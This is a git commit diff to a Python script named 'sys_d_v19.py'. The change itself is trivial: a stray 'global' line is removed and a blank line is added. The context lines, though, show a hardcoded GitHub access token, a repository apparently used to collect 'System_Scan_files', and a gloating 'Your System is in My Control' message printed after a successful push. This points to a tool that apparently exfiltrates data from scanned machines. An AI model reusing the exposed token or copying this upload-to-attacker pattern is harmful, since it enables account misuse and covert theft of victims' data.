55504a596694ff7dd45f1f542099e0ca487086d8
Sabari Poornesh S <geetaclass425@gmail.com>
2025-11-12 22:41:11 +0530

    Update sys_d_v19.py
    jj

--- sys_d_v19.py
+++ sys_d_v19.py
@@ -29,7 +29,6 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
-global
 GITHUB_TOKEN = "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"
 REPO_NAME = "amrita425/System_Scan_files"
 BRANCH = "main"
@@ -2073,4 +2072,5 @@ if __name__ == "__main__":
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
+
 
